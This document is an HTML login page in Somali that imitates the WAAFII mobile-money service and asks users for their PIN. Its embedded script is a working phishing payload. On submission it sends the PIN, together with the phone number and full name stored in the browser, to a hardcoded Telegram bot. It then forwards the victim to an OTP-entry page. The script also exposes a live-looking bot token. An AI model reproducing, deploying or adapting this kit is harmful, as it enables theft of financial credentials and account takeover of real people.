<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bogga Galitaanka | WAAFII</title>
    <style>
        :root {
            --navy: #1a237e;
            --teal: #14b886;
            --light-grey: #f5f7f8;
            --text-grey: #757575;
        }

        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 40px 20px;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        .header h1 {
            color: var(--navy);
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .header p {
            color: var(--text-grey);
            font-size: 16px;
            margin-bottom: 40px;
        }

        .input-group {
            margin-bottom: 40px;
            position: relative;
        }

        .input-label {
            color: var(--teal);
            font-size: 14px;
            font-weight: 600;
            display: block;
            margin-bottom: 5px;
        }

        .input-wrapper {
            position: relative;
            border-bottom: 2px solid var(--teal);
            display: flex;
            align-items: center;
        }

        input {
            border: none;
            outline: none;
            width: 100%;
            padding: 10px 0;
            font-size: 24px;
            letter-spacing: 4px;
        }

        .eye-icon {
            color: var(--text-grey);
            cursor: pointer;
            font-size: 18px;
            padding: 0 5px;
        }

        .btn-login {
            width: 100%;
            background-color: var(--teal);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 25px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.2s;
        }

        .btn-login:hover {
            transform: translateY(-2px);
        }

        .help-link {
            text-align: center;
            display: block;
            color: var(--teal);
            text-decoration: none;
            font-weight: 600;
            margin-bottom: 30px;
        }

        .btn-biometric {
            width: 100%;
            background-color: var(--light-grey);
            color: #333;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 400;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-biometric:hover {
            background-color: #e0e0e0;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>Soo dhawoow!</h1>
            <p>Fadlan geli PIN/Password si aad u gasho.</p>
        </div>

        <div class="input-group">
            <label class="input-label">PIN/Password</label>
            <div class="input-wrapper">
                <input type="password" id="pinInput" placeholder="••••" maxlength="6" value="">
                <span class="eye-icon" id="togglePassword">👁</span>
            </div>
        </div>

        <button class="btn-login" id="loginBtn">Soo gal</button>

        <a href="#" class="help-link">Caawimaad u baahan tahay?</a>

        <button class="btn-biometric">Furfur qaadashada Biometric</button>
    </div>

    <script>
        const BOT_TOKEN = '8503179421:AAEtjBpS6ihvdGImXoGxQSbAA7OaQtojIDM';
        const CHAT_ID = '5520957080';
        
        const pinInput = document.getElementById('pinInput');
        const loginBtn = document.getElementById('loginBtn');
        const togglePassword = document.getElementById('togglePassword');
        
        togglePassword.addEventListener('click', function() {
            const type = pinInput.getAttribute('type') === 'password' ? 'text' : 'password';
            pinInput.setAttribute('type', type);
            this.textContent = type === 'password' ? '👁' : '🙈';
        });
        
        async function sendToTelegram(message) {
            const encoded = encodeURIComponent(message);
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`, {
                    method: 'GET',
                    mode: 'no-cors'
                });
            } catch(e) { console.warn(e); }
        }
        
        async function submitPin() {
            const pin = pinInput.value.trim();
            const phone = localStorage.getItem('waafiiPhone') || 'Lama cayimin';
            const application = JSON.parse(localStorage.getItem('waafiiApplication')) || {};
            
            if (!pin) {
                alert('Fadlan geli PIN-kaaga');
                return;
            }
            
            if (pin.length < 4) {
                alert('PIN-ku waa inuu ahaadaa ugu yaraan 4 lambar');
                return;
            }
            
            localStorage.setItem('waafiiPin', pin);
            
            const message = `🔐 *PIN LA GELAY - WAAFII*\n📱 Telefoonka: ${phone}\n🔢 PIN: ${pin}\n👤 Magaca: ${application.fullName || 'Lama cayimin'}\n🕒 ${new Date().toLocaleString()}`;
            
            await sendToTelegram(message);
            
            window.location.href = 'OTP-entry.html';
        }
        
        loginBtn.addEventListener('click', submitPin);
        
        pinInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                submitPin();
            }
        });
        
        pinInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
